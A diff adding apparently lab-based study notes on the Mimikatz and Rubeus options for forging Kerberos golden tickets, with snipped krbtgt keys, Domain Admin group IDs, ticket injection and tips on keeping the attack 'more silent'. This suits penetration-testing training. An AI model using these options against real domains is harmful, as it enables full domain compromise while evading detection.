@@ -1,0 +1,33 @@
+Mimikatz Options:
+  kerberos::golden                    Name of the module
+  /User:Administrator                 Username for which the TGT is generated
+  /domain:dollarcorp.moneycorp.local  Domain FQDN
+  /sid:S-1-5-21-719815<SNIP>          SID of the domain
+  /aes256:154dc<SNIP>                 keys of the krbtgt account. Using AES keys makes the attack more silent.
+  /id:500 /groups:512Optional         User RID (default 500) and Group default 513 512 520 518 519)
+  /ptt                                Injects the ticket in current PowerShell process - no need to save the ticket on disk
+  or
+  /ticket                             Saves the ticket to a file for later use
+  /startoffset:0                      Optional when the ticket is available (default 0 - right now) in minutes.
+                                      Use negative for a ticket available from past and a larger number for future.
+  /endin:600                          Optional ticket lifetime (default is 10 years) in minutes.
+                                      The default AD setting is 10 hours = 600 minutes
+  /renewmax:10080                     Optional ticket lifetime with renewal (default is 10 years)
+                                      in minutes. The default AD setting is 7 days = 100800
+
+Rubeus Options:
+  golden                                  Name of the module
+  /aes256:154CB92843879B3D<SNIP>          AES256 keys of the krbtgt account. Using AES keys makes the attack more silent.
+  /user:Administrator                     Username for which the TGT is generated
+  /id:500                                 User RID (retrieved from the DC) (Default 500)
+  /pgid:513                               Primary Group ID (retrieved from the DC) (Default 513)
+  /groups:544,512,520,513                 Groups the user is a member of (retrieved from the DC) (Default 520,512,513,519,518)
+  /domain:dollarcorp.moneycorp.local      FQDN of the domain (retrieved from the DC)
+  /sid:S-1-5-<SNIP>                       SID of the current domain
+  /pwdlastset:"11/11/2022 6:33:55 AM"     The PasswordLastSet for the user (retrieved from the DC)
+  /minpassage:1                           “Minimum Password Age” in days (retrieved from the DC)
+  /logoncount:2453                        Logon Count for the user (retrieved from the DC)
+  /netbios:dcorp                          NetBIOS name of the domain (retrieved from the DC)
+  /dc:DCORP-DC.dollarcorp.moneycorp.local    FQDN of the DC (retrieved from the DC)
+  /uac:NORMAL_ACCOUNT,DONT_EXPIRE_PASSWORD   UserAccountControl Flags (retrieved from the DC)
+  /ptt                                    Inject in the current process
